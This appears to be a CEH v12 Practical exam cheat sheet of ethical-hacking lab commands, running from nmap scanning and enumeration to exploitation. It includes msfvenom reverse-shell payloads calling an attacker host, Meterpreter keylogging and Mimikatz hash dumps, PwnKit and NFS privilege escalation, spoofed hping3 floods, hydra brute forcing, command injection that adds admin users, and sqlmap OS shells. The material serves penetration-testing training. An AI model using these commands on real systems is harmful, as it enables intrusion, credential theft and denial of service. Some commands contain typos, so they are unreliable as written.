# CEH-v12-Practical

### Host discovery

- **nmap -sn -PR [IP]**
  - **-sn:** Disable port scan
  - **-PR:** ARP ping scan
- **nmap -sn -PR [RANGE] -oG [FILE]**
  - **-oG:** Grepable output to file
- **nmap -sn -PU [IP]**
  - **-PU:** UDP ping scan
- **nmap -sn -PE [IP or IP Range]**
  - **-PE:** ICMP ECHO ping scan
- **nmap -sn -PP [IP]**
  - **-PP:** ICMP timestamp ping scan
- **nmap -sn -PM [IP]**
  - **-PM:** ICMP address mask ping scan
- **nmap -sn -PS [IP]**
  - **-PS:** TCP SYN Ping scan
- **nmap -sn -PA [IP]**
  - **-PA:** TCP ACK Ping scan
- **nmap -sn -PO [IP]**
  - **-PO:** IP Protocol Ping scan

### Port and Service Discovery

- **nmap -sT -v [IP]**
  - **-sT:** TCP connect/full open scan
  - **-v:** Verbose output
- **nmap -sS -v [IP]**
  - **-sS:** Stealth scan/TCP hall-open scan
  - *Can be used to bypass firewall*
- **nmap -sX -v [IP]**
  - **-sX:** Xmax scan
- **nmap -sM -v [IP]**
  - **-sM:** TCP Maimon scan
- **nmap -sA -v [IP]**
  - **-sA:** ACK flag probe scan
  - *No response means filtered: stateful firewall present*
- **nmap -sU -v [IP]**
  - **-sU:** UDP scan
- **nmap -sN -T4 [IP]**
  - **-sN:** NULL scan
- **nmap -sI -v [IP]**
  - **-sI:** IDLE/IPID Header scan
- **nmap -sY -v [IP]**
  - **-sY:** SCTP INIT Scan
- **nmap -sZ -v [IP]**
  - **-sZ:** SCTP COOKIE ECHO Scan
- **nmap -sV -v [IP]**
  - **-sV:** Detect service versions

### OS Discovery

- **nmap -A -v [IP]**
  - **-A:** Aggressive (-O -sV -sC --traceroute)
- **nmap -O -v [IP]**
  - **-O:** OS discovery
- **nmap –-script smb-os-discovery.nse [IP]**
  - **-–script:** Specify the customized script
  - **smb-os-discovery.nse:** Determine the OS, computer name, domain, FQDN, workgroup, and current time over the SMB protocol (Port 445 or 139)

- Useful
  - **nmap -sC -sV -p- -A -v -O -T4 [IP]**
    - **-sC:** Performs a script scan using the default set of scripts.

  - **nmap -sP [RANGE]**
    - Obtain all active hosts via Ping scanning (or use **-sn -PS**)
  - **nmap -sC -sV -p- -A -v -O -T4 x.x.x.x,y,z**
    - Then several scans on important hosts on same subnet
  
  - List of nmap scripts: https://nmap.org/nsedoc/scripts/

## Enumeration

*NetBIOS, SNMP, LDAP, NFS, DNS, SMTP, RPC, SMB, FTP*

### NetBIOS enumeration using nbstat

- **nbtstat -a [IP]**
  - **-a:** Display NetBIOS name table
- **nbtstat -c**
  - **-c:** List content of the NetBIOS name cache

### NetBIOS enumeration using NSE Script

- **nmap -sV -v --script nbstat.nse [IP]**
  - **nbstat.nse:** Performs NetBIOS enumeration

### Enumerate SNMP using snmp-check

- **nmap -sU -p 161 [IP]**
  - *Check if SNMP port is open*
- **snmp-check [IP]**

### Enumerate SNMP using NSE

- **nmap -sU -p 161 --script snmp-sysdescr [IP]**
  - **snmp-sysdescr:** Server type and OS details
- **nmap -sU -p 161 --script snmp-processes [IP]**
  - **snmp-processes:** Running processes and associated ports
- **nmap -sU -p 161 --script snmp-win32-software [IP]**
  - **snmp-win32-software:** Applications running on Windows machine
- **nmap -sU -p 161 --script snmp-interfaces [IP]**
  - **snmp-win32-software:** Information about OS, network interfaces and applications installed

- Other:
  - *SMB enumeration*:
    - **nmap -p 445 --script smb-enum-shares [IP]**
    - **nmap -p 445 --script smb-enum-users --script-args smbusername=xx,smbpassword=xx  [IP]**
  - *RDP scanner*:
    - In Metasploit: **use auxiliary/scanner/rdp/rdp_scanner**

## Vulnerability Analysis

OpenVAS, Nessus, Nikto

### Perform Vulnerability Analysis using OpenVAS

- Scan -> Tasks -> Task Wizard

### Perform Web Servers and Applications Vulnerability Scanning using Nikto

- **nikto -h [URL] -Tuning [X] -o [OUTPUT_FILE] -F txt**
  - **Tuning**: specific test to perform, i.e 4==Injection

## System Hacking

### Perform Active Online Attack to Crack the System's Password using Responder

- **Linux:**
  - chmod +x ./Responder.py
  - **sudo ./Responder.py -I eth0**

- **Linux:**
  - Home/Responder/logs/SMB-NTMLv2-SSP-[IP].txt
  - **sudo john /home/ubuntu/Responder/logs/SMB-NTLMv2-SSP-10.10.10.10.txt**

### Escalate privileges using privilege escalation tools...

- Create malicious executable
  - **msfvenom -p windows/meterpreter/reverse_tcp --platfrom windows -a x86 -e x86/shitaka_ga_nai -b "\x00" LHOST=ATTACKER -f exe > EXE_FILE**

- Listener:
  - **msfconsole**
  - *use exploit/multi/handler*
  - *set payload windows/meterpreter/reverse_tcp*
  - *set LHOST ATTACKER*
  - *exploit -j -z*
- After executing file on VICTIM
  - *session -i X*
  - *getuid*
- Dump hash
  - *run post/windows/gather/smart_hashdump*
  - If insufficient privileges:
    - *getsystem -t 1*
  - If still problems then:
    - *background*
    - *use exploit/windows/local/bypassuac_fodhelper*
    - *set SESSION X*

### Hack a Windows Machine using Metasploit and perform post-exploitation using Meterpreter
- Using steps from previous lab and after getting a Meterpreter session.
  - *sysinfo, getuid, search -f FILE, keyscan_start, keyscan_dump, shell, dir /a:h, sc queryex type=service state=all, wmic*

### Escalate privileges by exploiting vulnerability in pkexec
- PwnKit: CVE-2021-4034
- https://github.com/berdav/CVE-2021-4034
  ```
  git clone https://github.com/berdav/CVE-2021-4034.git
  cd CVE-2021-4034
  make
  ./cve-2021-4034
  ```
### Escalate privileges in Linux machine by exploiting misconfigured NFS
- TCP/2049 nfs_acl
- In victim:
  - Install **nfs-kernel-server**
  - Add **/home *(rw,no_root_squash)** to **/etc/exports**
  - Restart **nfs-kernel-server**
- Install **nfs-common**
- List shares: ```showmount -e [TARGET_IP]``` or ```nmap -sV --script=nfs-showmount [TARGET_IP]```
- Mount: ```mount -t nfs [TARGET_IP]:/[SHARED_FOLDER] /tmp/share```
- Copy bash: ```cp /bin/bash /tmp/share && chmod +s /tmp/share/bash```
- Go to victim (via ssh for example) and execute ```bash -p``` on the [SHARED_FOLDER]

###  Escalate privileges by bypassing UAC and exploiting sticky keys
- Elevating on Windows 11 and replacing sticky keys with a elevated cmd

###  Escalate privileges to gather hashdump using Mimikatz
- After having a privileged Meterpreter session
  - *load kiwi*
  - *lsa_dump_sam*
    - Load NTLM Hash of all users
  - *lsa_dump_secrets*
    - LSA secrets that contain User password, IE passwords, service account passwords, SQL passwords.
  - *password_change -u Admin -n NTLM_HASH -P NEW_PASSWORD*

### Hide data using white space steganography
- Hide content
  - **snow -C -m "MESSAGE" -p "PASSWORD" ORIGINAL_FILE NEW_FILE**
- Reveal content
  - **snow -C -p "PASSWORD" NEW_FILE**

### Image steganography using OpenStego and StegOnline
 - **OpenStego**: Hide/Extract
 - **StegOnline**: https://stegonline.georgeom.net

### Covert Channels using Covert_TCP

- **Attacker:**
  - Create a file with a secret: echo "Secret"->message.txt
  - Copy and paste **covert_tcp.c**
  - Compile: **cc -o covert_tcp covert_tcp.c**
- **Target:**
  - **tcpdump -nvvx port 8888 -I lo**
  - Copy and paste **covert_tcp.c**
  - Compile: **cc -o covert_tcp covert_tcp.c**
  - **./covert_tcp -dest TARGET_IP -source ATTACKER_IP -source_port 9999 -dest_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt**
  - **Tcpdump captures no packets**
- **Attacker**
  - **./covert_tcp -dest TARGET_IP -source ATTACKER_IP -source_port 8888 -dest_port 9999 -file /home/attacker/Desktop/send/message.txt**
  - Wireshark (message string being send in individual packet)

## Malware Threat

### Gain control over a victim machine using njRAT RAT Trojan
- **njRAT**
  - Default port: 5552

- **ProRAT**
  - Default port: 5110
 
### Create a Trojan server ussing Theef RAT Trojan
- **Theef RAT**
  - Default port: 9871 or 6703
 
### Perform a string search using BinText
- **BinText**
  - Extract text from executable

### Analyze File using Detect It Easy (DIE)
- **DIE**
  - File Entry point, entropy, hash
 
## Module 08: Sniffing

** Password Sniffing using Wireshark**

- **Attacker**
  - Wireshark
- **Target**
  - [xxxxxxxxxxxxx](xxxxxxxxxxxxxxxxx)
  - Login
- **Attacker**
  - Stop capture
  - File->Save as
  - Filter: **http.request.method==POST**
  - Edit->Find Packet-> Find string equals to pwd form field

## Module 10: Denial-of-Service

### Perform a DoS Attack on a Target Host using hping3

- **Target:**
  - Wireshark->Ethernet
- **Attacker**
  - **hping3 -S [Target IP] -a [Spoofable IP] -p 22 -flood**
    - **-S: Set the SYN flag**
    - **-a: Spoof the IP address**
    - **-p: Specify the destination port**
    - **--flood: Send a huge number of packets**
- **Target**
  - Check Wireshark
- **Attacker (Perform PoD)**
  - **hping3 -d 65538 -S -p 21 –flood [Target IP]**
    - **-d: Specify data size**
    - **-S: Set the SYN flag**
- **Attacker (Perform UDP application layer flood attack)**
  - nmap -p 139 10.10.10.19 (check service)
  - **hping3 -2 -p 139 –flood [IP]**
    - **-2: Specify UDP mode**
- **Other UDP-based applications and their ports**
  - CharGen UDP Port 19
  - SNMPv2 UDP Port 161
  - QOTD UDP Port 17
  - RPC UDP Port 135
  - SSDP UDP Port 1900
  - CLDAP UDP Port 389
  - TFTP UDP Port 69
  - NetBIOS UDP Port 137,138,139
  - NTP UDP Port 123
  - Quake Network Protocol UDP Port 26000
  - VoIP UDP Port 5060

## Module 11: Session Hijacking

###  Detect Session Hijacking using Wireshark

- A high number of ARP requests indicate that a system is acting as a client for all IP addresses.

## Module 13: Hacking Web Servers

###  Crack FTP Credentials using a Dictionary Attack

- nmap -p 21 [IP]
- **hydra -L usernames.txt -P passwords.txt ftp://10.10.10.10**

**Other**
- hydra -l <username> -P <full path to pass> 10.10.119.16 -t 4 ssh
- hydra -l <username> -P <full path to pass> 10.10.119.16 -t 4 smb
- hydra -l <username> -P <wordlist> 10.10.119.16 http-post-form "<path>:<login_credentials>:<invalid_response>"
  - `hydra -l bob -P <wordlist> 10.10.119.16 http-post-form "/Login:username=^USER^&pwd=^PASS^:Login Failed"``

## Module 14: Hacking Web Applications

### Identify Web Server Directories using various tools

- **nmap -sV --script=http-enum [IP]**
  - Enumerate applications, directories, and files of the web server
- **gobuster dir -u [IP] -w [WORDLIST]**
  - Directory brute-forcing mode. Fast paced enumeration of hidden files and directories
  - ```gobuster dir -u [IP] -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt -q```
    - dir : directory listing
    - -u : host
    - -w : wordlists
    - -t : threads int / Number of concurrent threads (default 10)
    - -x : enumerate hidden files htm, php
    - -q : –quiet / Don’t print the banner and other noise

###  Perform a Brute-force Attack using Burp Suite

- Set proxy for browser: 127.0.0.1:8080
- Burpsuite
- Type random credentials
- Capture the request, right click->send to Intrucder
- Intruder->Positions
- Clear $
- Attack type: Cluster bomb
- Select account and password value, Add $
- Payloads: Load wordlist file for set 1 and set 2
- Start attack
- Filter by status and length that are different from the others. **filter status==302**
- Open the raw, get the credentials
- recover proxy settings

###  Exploit Parameter Tampering and XSS Vulnerabilities in Web Applications

- Log in a website, change the parameter value (id) in the URL
- Conduct a XSS attack: Submit script codes via text area

###  Enumerate and Hack a Web Application using WPScan and Metasploit

- **wpscan --api-token XXXXX --url http://10.10.10.16:8080/CEH --plugins-detection aggressive --enumerate u**
  - **--enumerate u: Specify the enumeration of users**
  - **--enumerate vp: Specify the enumeration of vulnerable plugins**
  - **API Token: Register at** [**https://wpscan.com/register**](https://wpscan.com/register)
- service postgresql start
- msfconsole
- **use auxiliary/scanner/http/wordpress_login_enum**
- show options
- **set PASS_FILE password.txt**
- **set RHOST 10.10.10.16**
- **set RPORT 8080**
- **set TARGETURI**  **http://10.10.10.16:8080/CEH**
- **set USERNAME admin**
- run
- Find the credential

###  Exploit a Remote Command Execution Vulnerability to Compromise a Target Web Server (DVWA low level security)

- If found command injection vulnerability in an input textfield
- | hostname
- | whoami
- **| tasklist| Taskkill /PID /F**
  - **/PID: Process ID value od the process**
  - **/F: Forcefully terminate the process**
- | dir C:\
- **| net user**
- **| net user user001 /Add**
- **| net localgroup Administrators user001 /Add**
- Use created account user001 to log in remotely

https://www.scribd.com/document/662376180/CEH-v12-LabManual-p04

###  Exploit a file upload vulnerability at different security levels **msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw**
- For LOW DVWA:
  - Create a file with output (reverse.php)
  - File Upload -> select reverse.php
- For MEDIUM DVWA:
  - Create a file with output (reverse.php.jpg)
  - File Upload -> select reverse.php.jpg
  - Intercept call with Burp Suite and change file name to reverse.php
- For HIGH DVWA:
  - Create a file with output (reverse.php.jpg) and add **GIF98** as header
  - File Upload -> select reverse.php.jpg
  - Command Injection -> | copy reverse.php.jpg reverse.php
- **msfconsole**
- **use exploit/multi/handler**
- **set payload php/meterpreter/reverse_tcp**
- **set LHOST=[IP]**
- **set LPORT=[PORT]**
- **run**
- Go to http://[DVWA]/dvwa/hackable/uploads/reverse.php

## Module 15: SQL Injection

### Perform an SQL Injection Attack Against MSSQL to Extract Databases using sqlmap
- Login a website
- Inspect element
- Dev tools->Console: document.cookie
- **sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie=[VALUE] –dbs**
  - **-u: Specify the target URL**
  - **--cookie: Specify the HTTP cookie header value**
  - **--dbs: Enumerate DBMS databases**
- Select a database to extract its tables
- **sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie=[VALUE] -D moviescope –-tables**
  - **-D: Specify the DBMS database to enumerate**
  - **--tables: Enumerate DBMS database tables**
- Select a table
- **sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie=[VALUE] -D moviescope –T User_Login --dump**
  - Get data of this table
- **sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie=[VALUE] --os-shell**
  - Get the OS Shell
- TASKLIST

- A request file can be used to easen the cookie and url parameters
  - Use Burp suite to intercept the request
  - Right click on the request windows and save item
  - use ```sqlmap -r REQUEST_FILE```

## Module 16: Hacking Wireless Networks

### Crack a WPA2 Network using Aircrack-ng

- Having the .pcap file with the WPA2 handshake.
- **aircrack-ng -a2 -w [WORDLIST_FILE] capture.pcap**
  - **-a2**: WPA2 cracking attack

## Module 17: Hacking Mobile Platforms

### Lab 1-Task 4: Exploit the Android Platform through ADB using PhoneSploit

- ADB port: TCP/5555
- cd Phonesploit
- python3 -m pip install colorama
- python3 phonesploit.py
- Connect a new phone -> 3
- Enter [PHONE_IP]
- Access shell on a phone -> 4
- Navigate shell

## Module 18: IoT and OT Hacking

### Lab 2-Task 1: Capture and Analyze IoT traffic using Wireshark

- Having the .pcap file with the IoT devices traffic with the MQTT Broker
- In Wireshark filter by **mqtt** protocol
- The headers flag meaning for Publish Message packets i- Select a **Publish Message** packet listed on Info column to see the message.
- Sequence: Publish Message -> Publish ACK -> Published Received -> Publish Release -> Publish Complete

## Module 20: Cryptography

- Calculate hash: HashCalc, MD5 Calculator, HashMyFiles (compare hashes)
- Online hashing lookup service: https://hashes.com/en/decrypt/hash
- Encode/Decode: BCTextEncoder, CryptoForge, CrypTool (.hex files, Analyze with given algorithm and key size)
  - Check the encoded message to see which tool was used as it will say as part of the header.

### Lab4-Task1: Perform Disk Encryption using VeraCrypt

- Create/Encrypt
  - Click VeraCrypt
  - Create Volume
  - Create an encrypted file container
  - Specify a path and file name
  - Set password
  - Select FAT
  - Check box in Random Pool
  - Move the mouse randomly for some seconds, and click Format
  - Mount into Drive Letter
  - Input password

- You might have an outer partition with a password and an inner hidden partition with another password, depending on the password you use on the mounting then is the partition that you get.

- Other: BitLocker Drive, Rohos Disk Encryption

## Appendix: Covered Tools

- **nmap**

  - Docs:
    - https://github.com/lyudaio/cheatsheets/blob/main/security/tools/nmap.md
  - **Run Nmap at the beginning**
    - nmap -sn -PR  192.168.1.1/24 -oN ip.txt
    - nmap -A -T4 -vv -iL ip.txt -oN nmap.txt 
    - nmap -sU -sV -A -T4 -v -oN udp.txt 

- **Windows SMB**

  - smbclient -L [IP]
  - smbclient \\ip\\sharename
  - nmap -p 445 -sV –script smb-enum-services [IP]
  - Metasploit: **auxiliary/scanner/smb/smb_login**
  - Metasploit: **auxiliary/scanner/smb/smb_enum**
  - smbget to obtain files
  
- **WPScan**

  - Docs: 
    - https://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation
    - https://wpmechanics.net/wpscan-cheat-sheet/
  - wpscan –-url http://[SERVER] -t 50 --usernames admin --passwords /path/to/password_file.txt
  - wpscan --url http://[SERVER] --enumerate u --passwords /path/to/password_file.txt
  - Metasploit WP password bruteforce
    - ```use auxiliary/scanner/http/wordpress_login_enum```

- **Nikto**

  - Docs:
    - https://ceh.securescape.cc/vulnerability-assessment/web-assessment/nikto
    - https://github.com/lyudaio/cheatsheets/blob/main/security/tools/nikto.md

- **John**

  - Docs:
    - https://github.com/lyudaio/cheatsheets/blob/main/security/tools/johntheripper.md
    - https://morgan-bin-bash.gitbook.io/pentesting/john-the-ripper-cheatsheet
    - https://4n3i5v74.github.io/posts/cheatsheet-john-the-ripper/
  - ```john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt /usr/share/wordlists/sha256.txt```

- **hydra**

  - Docs:
    - https://github.com/lyudaio/cheatsheets/blob/main/security/tools/hydra.md

- **Hashcat**

  - Docs:
    - Hash identifier: https://hashes.com/en/tools/hash_identifier
    - https://www.freecodecamp.org/news/hacking-with-hashcat-a-practical-guide/
    - https://cheatsheet.haax.fr/passcracking-hashfiles/hashcat_cheatsheet/
    - https://hashcat.net/wiki/doku.php?id=hashcat
    - https://hashcat.net/wiki/doku.php?id=example_hashes
    - https://tools.kali.org/password-attacks/hashcat
  - **Crack MD5 passwords with a wordlist:** ```hashcat hash.txt -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt```
  - ```hashcat -m 3200 -a 3 '$2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom' "?l?l?l?l"```
  - ```hashcat -a 0 -m 3200 blowfish.txt rockyou_4digits.txt --force```
    - -m = type of hash
    - -a = attack mode (1-3) 3 bruteforcing

- **Sigcheck**

  - Docs:
    - https://learn.microsoft.com/en-us/sysinternals/downloads/sigcheck
    - Calculate entropy: https://practicalsecurityanalytics.com/file-entropy/
  - 

- **Rainbow tables**

  - Docs:
    - https://github.com/Samsar4/Ethical-Hacking-Labs/blob/master/5-System-Hacking/3-Rainbow-tables.md
  - **Rainbowcrack**
    - Use Winrtgen to generate a rainbow table
    - Launch RainbowCrack
    - File->Load NTLM Hashes from PWDUMP File
    - Rainbow Table->Search Rainbow Table
    - Use the generated rainbow table
    - RainbowCrack automatically starts to crack the hashes

- **Steganography**

  - **Steghide**
    - **Hide**
    - steghide embed -cf [img file] -ef [file to be hide]
    - steghide embed -cf 1.jpg -ef 1.txt
    - Enter password or skip
    - **Extract**
    - steghide info 1.jpg
    - steghide extract -sf 1.jpg
    - Enter password if it does exist

  - **OpenStego**

    - Docs:
      - https://www.openstego.com/
  
  - **QuickStego**

    - Launch QuickStego
    - Open Image, and select target .jpg file
    - Open Text, and select a txt file
    - Hide text, save image file
    - Re-launch, Open Image
    - Select stego file
    - Hidden text shows up

 - **Snow**

  - ./snow -C -p "magic" output.txt  
  - snow -C -m "Secret Text Goes Here!" -p "magic" readme.txt readme2.txt
    • -m → Set your message
    • -p → Set your password

- **Dirb (Web content scanner)**

  - https://medium.com/tech-zoom/dirb-a-web-content-scanner-bc9cba624c86

- **Searchsploit (Exploit-DB)**

  - https://www.hackingarticles.in/comprehensive-guide-on-searchsploit/

- **ADB**
  ```
  adb devices -l

  # Connection Establish Steps
  adb connect 192.168.0.4:5555
  adb devices -l
  adb shell  

  # Download a File from Android using ADB tool
  adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt 
  adb pull sdcard/log.txt /home/mmurphy/Desktop
  ```

- **Privilege escalation**

    - Always a good idea to execute sudo -l on the victim to check the chances of attack.
    - **LinPEAS/WindPEAS**
      - Linux/Windows local Privilege Escalation Awesome Script (C#.exe and .bat, .sh)
      - https://github.com/carlospolop/PEASS-ng
        - ```curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh```
        - ```https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat```

## Useful Links

- Guide with commands for multiple tools [GOOD]: https://github.com/DarkLycn1976/CEH-Practical-Notes-and-Tools
  - Wireshark, SQLi, Sqlmap, wpscan, hydra, snow, CrypTool, HashCalc, VeraCrypt, BCTextEncoded, snow, ADB, phonesploit
- Several links [FAIR]: https://github.com/CyberSecurityUP/Guide-CEH-Practical-Master
  - Network scanning, Enumeration, Brute force, wordlists, SQLi, steganography, system hacking, web scanners, sniffers, CEH reviews.
- CEH Practical Preparation [FAIR]: https://chirag-singla.notion.site/chirag-singla/CEH-Practical-Preparation-7f2b77651cd144e8872f2f5a30155052
  - Nmap, Hydra, sqlmap, Nikto, john, wpscan, metasploit, nessus, openstego, quickstego, dirbuster
- CEH notes [FAIR]: https://book.thegurusec.com/certifications/certified-ethical-hacker-practical
  - All phases with tools
- Flag hunting CEH Labs [INTERESTING]: https://blogalpharhob.com/?cat=14
  - Different ways of obtaining the flags for questions

## Importan keywords

- Img hidden - Openstego
- .hex - Cryptool
- Whitespace - SNOW
- MD5 - Hashcalc & MD5 Calculator
- Encoded - BCTexteditor
- Volume & mount - Veracrypt

## Example questions and walkthroughs

- https://docs.google.com/document/d/1w-D4__FSRQW-1VMs0zzNlpPirxV6p7ESHTKvye2G464/edit
- CEH review 2023: https://www.youtube.com/playlist?list=PLZEA2EJpqSWfouVNPkl37AWEVCj6A2mdz
- DVWA walkthrough: https://cavementech.com/2022/12/dvwa-walkthrough.html